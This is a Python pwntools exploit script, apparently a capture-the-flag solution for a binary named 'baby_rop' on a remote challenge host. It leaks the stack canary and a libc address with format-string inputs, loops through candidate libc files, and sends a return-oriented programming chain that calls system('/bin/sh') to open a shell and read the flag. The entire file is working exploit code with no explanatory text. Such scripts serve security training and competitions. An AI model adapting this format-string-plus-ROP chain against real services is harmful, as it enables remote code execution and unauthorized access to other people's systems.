from pwn import *
context(os='linux', arch='amd64')
# p = process('./baby_rop')
i = 6
while True:
    p = remote('node.yuzhian.com.cn', 35294)
    elf = ELF('./baby_rop')
    libc_addr = './libc/' + str(i) + '.so'
    lib = ELF(libc_addr)
    payload = b'%41$p'
    p.sendline(payload)
    p.recvuntil(b'0x')
    canary = int(p.recv(16), 16)
    print(hex(canary))
    ret = 0x000000000040101a
    payload = p64(ret) * 30 + p64(elf.sym['main']) + p64(canary)
    print(len(payload))
    p.send(payload)
    payload = b'%25$p'
    p.sendline(payload)
    p.recvuntil(b'0x')
    base_addr = int(p.recv(12), 16) - lib.symbols['_IO_2_1_stderr_']
    print(hex(base_addr))
    puts_got = elf.got['puts']
    system_addr = base_addr + lib.symbols['system']
    bin_addr = base_addr + next(lib.search(b'/bin/sh'))
    pop_rdi = 0x0000000000401413
    payload = p64(ret) * 28 + p64(pop_rdi) + p64(bin_addr) + p64(system_addr) + p64(canary)
    try:
        p.sendline(payload)
        sleep(1)
        print(i)
        p.sendline(b'cat flag')
        p.interactive()
    except:
        p.close()
